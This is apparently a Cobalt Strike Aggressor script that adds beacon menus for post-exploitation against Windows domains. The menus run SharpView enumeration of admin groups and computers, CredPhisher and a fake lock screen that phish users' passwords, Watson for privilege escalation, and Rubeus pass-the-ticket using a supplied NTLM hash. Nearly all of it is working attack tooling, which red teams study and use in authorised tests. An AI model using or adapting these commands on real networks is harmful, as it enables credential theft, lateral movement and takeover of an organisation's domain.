##########################

##Define the pop up menu name

##

##########################



popup beacon_top {

	menu "Enumeration" {





##########################

##List All Items in Pop Up Menu

##

##########################



menu "Domain Group Enumeration"

{

########List Groups in Domain##################

		item "Enterprise Admin"{

			local('$bid');

				foreach $bid ($1){

					getnetgroupenterpriseadmin($bid);

				}

			}

			

		item "Domain Admin"{

			local('$bid');

				foreach $bid ($1){

					getnetgroupdomainadmin($bid);

				}

			}

			

		item "Schema Admin"{

			local('$bid');

				foreach $bid ($1){

					getnetgroupschemaadmin($bid);

				}

			}

		

		item "Account Operator"{

			local('$bid');

				foreach $bid ($1){

					getnetgroupaccountoperator($bid);

				}

			}

					

			

		item "Administrator"{

			local('$bid');

				foreach $bid ($1){

					getnetgroupadministrator($bid);

				}

			}

			

############			

}



menu "Domain User Enumeration"

{

########List People in Domain##################

					

		item "List Admins in Domain"{

			local('$bid');

				foreach $bid ($1){

					getnetuseradmin($bid);

				}

			}

}



menu "Phishing Users"

{

########Run CredPhisher##################

					

		item "Prompt for Username and Password"{

			local('$bid');

				foreach $bid ($1){

					credphisher($bid);

				}

			}

		

			

########Run Lock Screen Phishing Exploit##################

					

		item "Show Lockscreen to Phish Password"{

			local('$bid');

				foreach $bid ($1){

					lockscreen($bid);

				}

			}

		

}

menu "Privilege Escalation"

{

	

########Run Watson by Rastamouse##################

					

		item "Run Watson to find missing patches"{

			local('$bid');

				foreach $bid ($1){

					escalateprivs($bid);

				}

			}

		



}


menu "Domain Computer Object Enumeration"

{

	

########List computers in Domain##################

					

		item "List Computers"{

			local('$bid');

				foreach $bid ($1){

					getdomaincomputer($bid);

				}

			}

		



}



menu "Domain/Forest Enumeration"

{

########List Domains/Forest in Domain##################

					

		

########Get Domain Security Identifier (SID)#######

		item "List Domain SID"{

			local('$bid');

				foreach $bid ($1){

					getdomainsid($bid);

					}

				}

}



menu "Trust"

########List Trust in Domain##################

{					

	

}


menu "Pass The Ticket"
{
	item "Pass Ticket"{

			local('$bid');

				foreach $bid ($1){

					passticket($bid);

					}

				}
}
					

					



	

	









################

## These last two brackets close out the above functions

##

##

################

		}

	}

  





###########################

##Define variables for functions e.g., sub

##

###########################



sub getdomainsid{



bexecute_assembly($1, script_resource('/exe/SharpView.exe'), "Get-DomainSID");



}



sub getdomaincomputer{



bexecute_assembly($1, script_resource('/exe/SharpView.exe'), "Get-DomainComputer");



}



sub getnetuseradmin{



bexecute_assembly($1, script_resource('/exe/SharpView.exe'), "Get-NetUser -AdminCount");



}



sub getnetgroupenterpriseadmin{



bexecute_assembly($1, script_resource('/exe/SharpView.exe'), 'Get-NetGroup -Identity "Enterprise Admins" -Recursive');



}



sub getnetgroupdomainadmin{



bexecute_assembly($1, script_resource('/exe/SharpView.exe'), 'Get-NetGroup -Identity "Domain Admins" -Recursive');



}



sub getnetgroupschemaadmin{



bexecute_assembly($1, script_resource('/exe/SharpView.exe'), 'Get-NetGroup -Identity "Schema Admins" -Recursive');



}



sub getnetgroupaccountoperator{



bexecute_assembly($1, script_resource('/exe/SharpView.exe'), 'Get-NetGroup -Identity "Account Operators" -Recursive');



}



sub getnetgroupadministrator{



bexecute_assembly($1, script_resource('/exe/SharpView.exe'), 'Get-NetGroup -Identity "Administrators" -Recursive');



}



sub credphisher{



bexecute_assembly($1, script_resource('/exe/CredPhisher.exe'), 'Please_Enter_Your_Password');



}



sub lockscreen{



bexecute_assembly($1, script_resource('/exe/WindowsFormsApp9.exe'));



}

sub escalateprivs{



bexecute_assembly($1, script_resource('/exe/Watson.exe'));



}

sub passticket{
 # beacon ID
    $bid = $1;
    
 # command arugement variable  
    $cmdargs = "";
  
 # Pop Dialog Box and control flow
    $dialog = dialog("Pass The Ticket", %(execmethod => "Execute-Assembly"), lambda({
 
 # manipulate the first argument depending on the executables command line switch statements
 # manipulate the second argument depending on the expected input format  
        foreach $key => $value ($3){
            if ($value ne "" && $value ne "false" && $value ne "true" && $key ne "execmethod"){
                $cmdargs .= ' /';
                $cmdargs .= $key;
                $cmdargs .= ':';
                $cmdargs .= $value.' ';
            }
 # manipulate the first argument depending on the executables command line switch statements            
            else if ($value eq "true"){
                $cmdargs .= ' /';
                $cmdargs .= $key;
            }
        }
 # btask just displays message in beacon window
 # execute assembly it is important to notate the use of periods for concatenating the ptt switch      
       if ($3["execmethod"] eq "Execute-Assembly"){
            btask($bid, 'Executing Pass The Ticket via Execute-Assembly');
            bexecute_assembly($bid, script_resource('/exe/Rubeus.exe'), 'asktgt'.$cmdargs.''."/ptt");
        }
      
    }));
    
 # Dialog box contents and text boxes mapped to command line argument keys   
    dialog_description($dialog, "**Think with your Tickets, Jimmy!** Use the FQDN for the Domain input!");
    drow_text($dialog, "user",  "User");
    drow_text($dialog, "rc4",  "RC4/NTLM");
    drow_text($dialog, "domain",  "FQ Domain Name");
    dbutton_action($dialog, "Run");
	dialog_show($dialog);

}

